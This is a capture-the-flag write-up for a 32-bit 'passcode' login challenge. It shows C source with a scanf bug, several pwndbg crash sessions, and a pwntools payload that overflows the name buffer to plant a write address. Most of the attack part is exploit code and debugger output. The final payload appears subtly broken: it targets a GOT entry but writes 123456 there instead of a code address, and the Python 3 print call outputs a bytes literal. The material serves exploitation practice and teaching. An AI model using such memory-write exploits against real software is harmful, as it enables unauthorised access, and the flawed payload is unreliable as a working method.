

## the code 

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.1 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

## GDB 
```bash
passcode@ubuntu:~$ gdb passcode 
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04.2) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 187 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $hex2ptr, $argv, $envp, $argc, $environ, $bn_sym, $bn_var, $bn_eval, $ida GDB functions (can be used with print/break)
Reading symbols from passcode...
(No debugging symbols found in passcode)
------- tip of the day (disable with set show-tips off) -------
Use plist command to dump elements of linked list
pwndbg>
```

```bash
pwndbg> r
Starting program: /home/passcode/passcode 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Toddler's Secure Login System 1.1 beta.
enter you name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
enter passcode1 : 123456

Program received signal SIGSEGV, Segmentation fault.
0xf7d01f80 in __vfscanf_internal (s=<optimized out>, format=<optimized out>, argptr=<optimized out>, mode_flags=<optimized out>) at ./stdio-common/vfscanf-internal.c:1896
1896    ./stdio-common/vfscanf-internal.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────
 EAX  0x1e240
 EBX  0x40
 ECX  0xffe054c4 ◂— 0x41414141 ('AAAA')
 EDX  0x41414141 ('AAAA')
 EDI  0xffe054c8 ◂— 0x41414141 ('AAAA')
 ESI  7
 EBP  0xffe05498 —▸ 0xffe054e8 —▸ 0xffe054f8 —▸ 0xf7f24020 (_rtld_global) —▸ 0xf7f24a40 ◂— ...
 ESP  0xffe04e70 —▸ 0xf7eceda0 (_IO_2_1_stdout_) ◂— 0xfbad2a84
 EIP  0xf7d01f80 (__vfscanf_internal+19248) ◂— mov dword ptr [edx], eax
───────────────────────────────────────────────[ DISASM / i386 / set emulate off ]───────────────────────────────────────────────
 ► 0xf7d01f80 <__vfscanf_internal+19248>    mov    dword ptr [edx], eax     <Cannot dereference [0x41414141]>
   0xf7d01f82 <__vfscanf_internal+19250>    jmp    __vfscanf_internal+6419     <__vfscanf_internal+6419>
    ↓
   0xf7cfed63 <__vfscanf_internal+6419>     add    dword ptr [ebp - 0x5d0], 1
   0xf7cfed6a <__vfscanf_internal+6426>     mov    ebx, dword ptr [ebp - 0x57c]
   0xf7cfed70 <__vfscanf_internal+6432>     jmp    __vfscanf_internal+636      <__vfscanf_internal+636>
    ↓
   0xf7cfd6cc <__vfscanf_internal+636>      movzx  eax, byte ptr [ebx]
   0xf7cfd6cf <__vfscanf_internal+639>      test   al, al
   0xf7cfd6d1 <__vfscanf_internal+641>      jne    __vfscanf_internal+481      <__vfscanf_internal+481>
 
   0xf7cfd6d7 <__vfscanf_internal+647>      mov    eax, dword ptr [ebp - 0x5ac]
   0xf7cfd6dd <__vfscanf_internal+653>      test   eax, eax
   0xf7cfd6df <__vfscanf_internal+655>      je     __vfscanf_internal+1376     <__vfscanf_internal+1376>
────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────
00:0000│ esp 0xffe04e70 —▸ 0xf7eceda0 (_IO_2_1_stdout_) ◂— 0xfbad2a84
01:0004│-624 0xffe04e74 —▸ 0x80b51a0 ◂— 'enter passcode1 : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\n'
02:0008│-620 0xffe04e78 ◂— 0x6e /* 'n' */
03:000c│-61c 0xffe04e7c ◂— 0
04:0010│-618 0xffe04e80 —▸ 0xf7e61264 ◂— 'to_inpunct'
05:0014│-614 0xffe04e84 ◂— 0x7d4
06:0018│-610 0xffe04e88 —▸ 0xf7e62a68 (dot) ◂— 0x5750002e /* '.' */
07:001c│-60c 0xffe04e8c ◂— 0
──────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────
 ► 0 0xf7d01f80 __vfscanf_internal+19248
   1 0xf7cfcc89 __isoc99_scanf+41
   2 0x804922d login+55
   3 0x804939a main+54
   4 0xf7cc5519 __libc_start_call_main+121
   5 0xf7cc55f3 __libc_start_main+147
   6 0x804910c _start+44
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

### debugging welcome function
```bash
pwndbg> b login
Breakpoint 1 at 0x80491fb
pwndbg> r
Starting program: /home/passcode/passcode 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Toddler's Secure Login System 1.1 beta.
enter you name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!

Breakpoint 1, 0x080491fb in login ()
Disabling the emulation via Unicorn Engine that is used for computing branches as there isn't enough memory (1GB) to use it (since mmap(1G, RWX) failed). See also:
* https://github.com/pwndbg/pwndbg/issues/1534
* https://github.com/unicorn-engine/unicorn/pull/1743
Either free your memory or explicitly set `set emulate off` in your Pwndbg config
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────
 EAX  0
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
 ECX  0
 EDX  0
 EDI  0xf7fe0b80 (_rtld_global_ro) ◂— 0
 ESI  0xff9bbbc4 —▸ 0xff9bcd0e ◂— '/home/passcode/passcode'
 EBP  0xff9bbae8 —▸ 0xff9bbaf8 —▸ 0xf7fe1020 (_rtld_global) —▸ 0xf7fe1a40 ◂— 0
 ESP  0xff9bbae0 —▸ 0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
 EIP  0x80491fb (login+5) ◂— sub esp, 0x10
───────────────────────────────────────────────[ DISASM / i386 / set emulate off ]───────────────────────────────────────────────
 ► 0x80491fb <login+5>     sub    esp, 0x10     ESP => 0xff9bbae0 - 0x10
   0x80491fe <login+8>     call   __x86.get_pc_thunk.bx       <__x86.get_pc_thunk.bx>
 
   0x8049203 <login+13>    add    ebx, 0x2dfd
   0x8049209 <login+19>    sub    esp, 0xc
   0x804920c <login+22>    lea    eax, [ebx - 0x1ff8]
   0x8049212 <login+28>    push   eax
   0x8049213 <login+29>    call   printf@plt                  <printf@plt>
 
   0x8049218 <login+34>    add    esp, 0x10
   0x804921b <login+37>    sub    esp, 8
   0x804921e <login+40>    push   dword ptr [ebp - 0x10]
   0x8049221 <login+43>    lea    eax, [ebx - 0x1fe5]
────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────
00:0000│ esp 0xff9bbae0 —▸ 0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
01:0004│-004 0xff9bbae4 —▸ 0xff9bbbc4 —▸ 0xff9bcd0e ◂— '/home/passcode/passcode'
02:0008│ ebp 0xff9bbae8 —▸ 0xff9bbaf8 —▸ 0xf7fe1020 (_rtld_global) —▸ 0xf7fe1a40 ◂— 0
03:000c│+004 0xff9bbaec —▸ 0x804939a (main+54) ◂— sub esp, 0xc
04:0010│+008 0xff9bbaf0 —▸ 0xff9bbb10 ◂— 1
05:0014│+00c 0xff9bbaf4 —▸ 0xf7f8b000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
06:0018│+010 0xff9bbaf8 —▸ 0xf7fe1020 (_rtld_global) —▸ 0xf7fe1a40 ◂— 0
07:001c│+014 0xff9bbafc —▸ 0xf7d82519 (__libc_start_call_main+121) ◂— add esp, 0x10
──────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────
 ► 0 0x80491fb login+5
   1 0x804939a main+54
   2 0xf7d82519 __libc_start_call_main+121
   3 0xf7d825f3 __libc_start_main+147
   4 0x804910c _start+44
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/20wx $ebp-16
0xff9bbad8:     0x41414141      0x20331500      0x0804c000      0xff9bbbc4
0xff9bbae8:     0xff9bbaf8      0x0804939a      0xff9bbb10      0xf7f8b000
0xff9bbaf8:     0xf7fe1020      0xf7d82519      0xff9bcd0e      0x00000070
0xff9bbb08:     0xf7fe1000      0xf7d82519      0x00000001      0xff9bbbc4
0xff9bbb18:     0xff9bbbcc      0xff9bbb30      0xf7f8b000      0x08049364
```

`0x41414141` its means `AAAA`

```bash
pwndbg> c
Continuing.
enter passcode1 : 123456

Program received signal SIGSEGV, Segmentation fault.
0xf7dbef80 in __vfscanf_internal (s=<optimized out>, format=<optimized out>, argptr=<optimized out>, mode_flags=<optimized out>) at ./stdio-common/vfscanf-internal.c:1896
1896    ./stdio-common/vfscanf-internal.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────
*EAX  0x1e240
*EBX  0x40
*ECX  0xff9bbac4 ◂— 0x41414141 ('AAAA')
*EDX  0x41414141 ('AAAA')
*EDI  0xff9bbac8 ◂— 0x41414141 ('AAAA')
*ESI  7
*EBP  0xff9bba98 —▸ 0xff9bbae8 —▸ 0xff9bbaf8 —▸ 0xf7fe1020 (_rtld_global) —▸ 0xf7fe1a40 ◂— ...
*ESP  0xff9bb470 —▸ 0xf7f8bda0 (_IO_2_1_stdout_) ◂— 0xfbad2a84
*EIP  0xf7dbef80 (__vfscanf_internal+19248) ◂— mov dword ptr [edx], eax
───────────────────────────────────────────────[ DISASM / i386 / set emulate off ]───────────────────────────────────────────────
 ► 0xf7dbef80 <__vfscanf_internal+19248>    mov    dword ptr [edx], eax     <Cannot dereference [0x41414141]>
   0xf7dbef82 <__vfscanf_internal+19250>    jmp    __vfscanf_internal+6419     <__vfscanf_internal+6419>
    ↓
   0xf7dbbd63 <__vfscanf_internal+6419>     add    dword ptr [ebp - 0x5d0], 1
   0xf7dbbd6a <__vfscanf_internal+6426>     mov    ebx, dword ptr [ebp - 0x57c]
   0xf7dbbd70 <__vfscanf_internal+6432>     jmp    __vfscanf_internal+636      <__vfscanf_internal+636>
    ↓
   0xf7dba6cc <__vfscanf_internal+636>      movzx  eax, byte ptr [ebx]
   0xf7dba6cf <__vfscanf_internal+639>      test   al, al
   0xf7dba6d1 <__vfscanf_internal+641>      jne    __vfscanf_internal+481      <__vfscanf_internal+481>
 
   0xf7dba6d7 <__vfscanf_internal+647>      mov    eax, dword ptr [ebp - 0x5ac]
   0xf7dba6dd <__vfscanf_internal+653>      test   eax, eax
   0xf7dba6df <__vfscanf_internal+655>      je     __vfscanf_internal+1376     <__vfscanf_internal+1376>
────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────
00:0000│ esp 0xff9bb470 —▸ 0xf7f8bda0 (_IO_2_1_stdout_) ◂— 0xfbad2a84
01:0004│-624 0xff9bb474 —▸ 0x932b1a0 ◂— 'enter passcode1 : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\n'
02:0008│-620 0xff9bb478 ◂— 0x6e /* 'n' */
03:000c│-61c 0xff9bb47c ◂— 0
04:0010│-618 0xff9bb480 —▸ 0xf7f1e264 ◂— 'to_inpunct'
05:0014│-614 0xff9bb484 ◂— 0x7d4
06:0018│-610 0xff9bb488 —▸ 0xf7f1fa68 (dot) ◂— 0x5750002e /* '.' */
07:001c│-60c 0xff9bb48c ◂— 0
──────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────
 ► 0 0xf7dbef80 __vfscanf_internal+19248
   1 0xf7db9c89 __isoc99_scanf+41
   2 0x804922d login+55
   3 0x804939a main+54
   4 0xf7d82519 __libc_start_call_main+121
   5 0xf7d825f3 __libc_start_main+147
   6 0x804910c _start+44
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Vulnerable

We could control last 4 bytes of name chars:
```c
char name[100];
```

```asm
 ECX  0xffe054c4 ◂— 0x41414141 ('AAAA')
 EDX  0x41414141 ('AAAA')
 EDI  0xffe054c8 ◂— 0x41414141 ('AAAA')
```

## Exploit


```python
from pwn import *
payload  = b"A"*96
payload += p32(0x0804c014)
payload += b"\n123456\n"
payload += b"13371337\n"
print(payload)
```


```bash
python -c "from pwn import *; print(b'A'*96 + p32(0x0804c014) + b'\n123456\n')" | ./passcode
```


